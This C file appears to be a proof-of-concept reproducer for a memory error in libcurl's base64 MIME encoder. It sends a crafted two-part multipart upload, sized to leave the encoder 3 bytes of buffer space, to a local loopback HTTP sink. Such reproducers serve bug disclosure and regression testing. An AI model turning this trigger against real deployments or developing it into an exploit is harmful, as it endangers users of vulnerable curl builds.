/*
 * PoC: drive base64-encoded mime parts through libcurl's public API
 * (curl_mime_* + curl_easy_perform against a local HTTP listener).
 *
 * part 1: in-memory ballast part of 23624 bytes, base64-encoded
 * part 2: 512 KiB base64-encoded part fed by a read callback
 * upload buffer size: 32769 bytes
 *
 * With this combination the multipart body is laid out so that the base64
 * encoder is asked to encode part 2 with exactly 3 bytes of output space
 * left in the readback buffer.
 *
 * Exit code 0 = clean transfer (no memory error).
 */
#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/wait.h>

#define BIG_SIZE (512UL * 1024)
#define BALLAST_SIZE 23624
#define UPLOAD_BUF 32769

struct pooh {
  size_t left;
  char byte;
};

static size_t read_cb(char *buffer, size_t size, size_t nitems, void *arg)
{
  struct pooh *p = (struct pooh *)arg;
  size_t n = nitems < p->left ? nitems : p->left;
  (void)size;
  if(n) {
    memset(buffer, p->byte, n);
    p->left -= n;
  }
  return n;
}

/* Local HTTP sink: read the full request, then answer 200. */
static int spawn_sink(unsigned short *port)
{
  int lfd, on = 1;
  struct sockaddr_in addr;
  socklen_t alen = sizeof(addr);
  pid_t pid;

  lfd = socket(AF_INET, SOCK_STREAM, 0);
  if(lfd < 0)
    return -1;
  if(setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on)) < 0)
    return -1;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  addr.sin_port = 0;
  for(;;) {
    if(bind(lfd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
      return -1;
    if(getsockname(lfd, (struct sockaddr *)&addr, &alen) < 0)
      return -1;
    *port = ntohs(addr.sin_port);
    if(*port >= 10000)          /* keep the Host: header length stable */
      break;
    addr.sin_port = 0;
  }
  if(listen(lfd, 1) < 0)
    return -1;

  pid = fork();
  if(pid < 0)
    return -1;
  if(pid == 0) {
    /* child */
    int cfd;
    char buf[8192];
    static const char resp[] =
      "HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";

    cfd = accept(lfd, NULL, NULL);
    if(cfd >= 0) {
      ssize_t n;
      size_t body = 0, clen = 0, hlen = 0;
      char hdr[8192];
      char *he;

      /* Read the request head first. */
      while(hlen < sizeof(hdr) - 1 &&
            (n = recv(cfd, hdr + hlen, sizeof(hdr) - 1 - hlen, 0)) > 0) {
        hlen += (size_t)n;
        hdr[hlen] = 0;
        if(strstr(hdr, "\r\n\r\n"))
          break;
      }
      he = strstr(hdr, "\r\n\r\n");
      if(he) {
        char *cl = strcasestr(hdr, "content-length:");
        if(cl)
          clen = (size_t)strtoul(cl + 15, NULL, 10);
        body = hlen - (size_t)(he + 4 - hdr);
      }
      /* Wait for the complete request body before answering. */
      while(body < clen && (n = recv(cfd, buf, sizeof(buf), 0)) > 0)
        body += (size_t)n;

      {
        size_t sent = 0;
        while(sent < sizeof(resp) - 1) {
          n = send(cfd, resp + sent, sizeof(resp) - 1 - sent, 0);
          if(n <= 0)
            break;
          sent += (size_t)n;
        }
      }
      for(;;) {
        n = recv(cfd, buf, sizeof(buf), 0);
        if(n <= 0)
          break;
      }
      close(cfd);
    }
    close(lfd);
    _exit(0);
  }
  close(lfd);
  return 0;
}

int main(void)
{
  unsigned short port = 0;
  char url[128];
  CURL *curl;
  curl_mime *mime;
  curl_mimepart *part;
  struct curl_slist *hdrs = NULL;
  struct pooh p2;
  char *ballast;
  CURLcode res;
  int status = 1;

  if(spawn_sink(&port)) {
    fprintf(stderr, "sink setup failed\n");
    return 2;
  }
  snprintf(url, sizeof(url), "http://127.0.0.1:%u/poc", port);

  if(curl_global_init(CURL_GLOBAL_ALL)) {
    fprintf(stderr, "global init failed\n");
    return 2;
  }

  curl = curl_easy_init();
  if(!curl)
    goto cleanup;

  ballast = malloc(BALLAST_SIZE);
  p2.left = BIG_SIZE;
  p2.byte = 'A';
  if(!ballast) {
    fprintf(stderr, "oom\n");
    goto cleanup;
  }
  memset(ballast, 'x', BALLAST_SIZE);

  mime = curl_mime_init(curl);

  part = curl_mime_addpart(mime);
  if(curl_mime_name(part, "one") != CURLE_OK ||
     curl_mime_data(part, ballast, BALLAST_SIZE) != CURLE_OK ||
     curl_mime_encoder(part, "base64") != CURLE_OK) {
    fprintf(stderr, "mime setup failed\n");
    curl_mime_free(mime);
    goto cleanup;
  }

  part = curl_mime_addpart(mime);
  if(curl_mime_name(part, "two") != CURLE_OK ||
     curl_mime_data_cb(part, (curl_off_t)p2.left, read_cb, NULL, NULL,
                       &p2) != CURLE_OK ||
     curl_mime_encoder(part, "base64") != CURLE_OK) {
    fprintf(stderr, "mime setup failed\n");
    curl_mime_free(mime);
    goto cleanup;
  }

  hdrs = curl_slist_append(hdrs, "Expect:");

  if(curl_easy_setopt(curl, CURLOPT_URL, url) != CURLE_OK ||
     curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime) != CURLE_OK ||
     curl_easy_setopt(curl, CURLOPT_HTTPHEADER, hdrs) != CURLE_OK ||
     curl_easy_setopt(curl, CURLOPT_UPLOAD_BUFFERSIZE,
                      (long)UPLOAD_BUF) != CURLE_OK) {
    fprintf(stderr, "setopt failed\n");
    curl_mime_free(mime);
    goto cleanup;
  }

  res = curl_easy_perform(curl);
  if(res == CURLE_OK)
    status = 0;
  else
    fprintf(stderr, "perform failed: %s\n", curl_easy_strerror(res));

  curl_mime_free(mime);
  free(ballast);

cleanup:
  curl_slist_free_all(hdrs);
  curl_easy_cleanup(curl);
  curl_global_cleanup();
  wait(NULL);
  return status;
}
